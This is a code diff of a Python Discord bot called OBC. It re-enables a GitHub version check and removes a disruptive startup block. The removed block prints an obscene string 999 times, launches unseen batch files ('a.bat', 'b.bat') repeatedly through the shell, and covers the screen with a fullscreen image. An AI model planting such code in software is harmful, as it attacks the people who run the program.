@@ -10,15 +10,14 @@ import warnings
 from database import version
 from database import versionHash
 import requests
-import subprocess
-import pygame
+
 
 update = False
 colorama.init(autoreset=True)
 
 # FİLTER
 warnings.filterwarnings("ignore")
-image_path = "s.jpg"
+
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
@@ -27,30 +26,30 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 # VERSİON CONTROL
 
 
-#try:
-#    url = "https://raw.githubusercontent.com/berhatpasha/OBC/main/OBC/versionControl/version"
-#    response = requests.get(url)
-#    response.raise_for_status()
-#    content = response.text.strip()
-#
-#    print(f"{Fore.CYAN}Last version : {content}")
-#    print(f"{Fore.CYAN}Used version : {versionHash}")
-#    if versionHash == content:
-#        print(f"{Fore.GREEN}OBC in its most current version ✓")
-#        time.sleep(3)
-#    else:
-#        print("\n"*2)
-#        print(f"{Fore.YELLOW}Update available ! ")
-#        print(f"{Fore.YELLOW}Use : git clone https://github.com/berhatpasha/OBC.git")
-#        update = True
-#except requests.exceptions.RequestException as e:
-#    print(f"Request failed: {e}")
+try:
+    url = "https://raw.githubusercontent.com/berhatpasha/OBC/main/OBC/versionControl/version"
+    response = requests.get(url)
+    response.raise_for_status()
+    content = response.text.strip()
 
-#if update:
-#    print(f"{Fore.YELLOW} It will resume in 20 seconds.")
-#    time.sleep(20)
-#else:
-#    time.sleep(5)
+    print(f"{Fore.CYAN}Last version : {content}")
+    print(f"{Fore.CYAN}Used version : {versionHash}")
+    if versionHash == content:
+        print(f"{Fore.GREEN}OBC in its most current version ✓")
+        time.sleep(3)
+    else:
+        print("\n"*2)
+        print(f"{Fore.YELLOW}Update available ! ")
+        print(f"{Fore.YELLOW}Use : git clone https://github.com/berhatpasha/OBC.git")
+        update = True
+except requests.exceptions.RequestException as e:
+    print(f"Request failed: {e}")
+
+if update:
+    print(f"{Fore.YELLOW} It will resume in 20 seconds.")
+    time.sleep(20)
+else:
+    time.sleep(5)
 
 
 
@@ -82,30 +81,6 @@ print(f'''{Fore.LIGHTBLUE_EX}
 ''')
 
 
-print(f"{Fore.RED}fuck_you"*999) 
-for _ in range(10):
-    subprocess.Popen(['start', 'a.bat'], shell=True)
-pygame.init()
-screen_info = pygame.display.Info()
-screen_width = screen_info.current_w
-screen_height = screen_info.current_h
-screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)
-image = pygame.image.load(image_path)
-image = pygame.transform.scale(image, (screen_width, screen_height))
-subprocess.Popen(['start', 'b.bat'], shell=True)
-screen.blit(image, (0, 0))
-pygame.display.update()
-running = True
-while running:
-    for event in pygame.event.get():
-        if event.type == pygame.QUIT:
-            running = False
-        elif event.type == pygame.KEYDOWN:
-            if event.key == pygame.K_ESCAPE:
-                running = False
-pygame.quit()
-sys.exit()
-subprocess.Popen(['start', 'b.bat'], shell=True)
 async def emergencyMode():
     for guild in bot.guilds:
         print(f'Sending warning message to {guild.name} server')
@@ -329,8 +304,6 @@ async def read_user_input():
         else:
             print(f"{Fore.LIGHTWHITE_EX}Passed")
             
-
-
 
 
 @bot.event
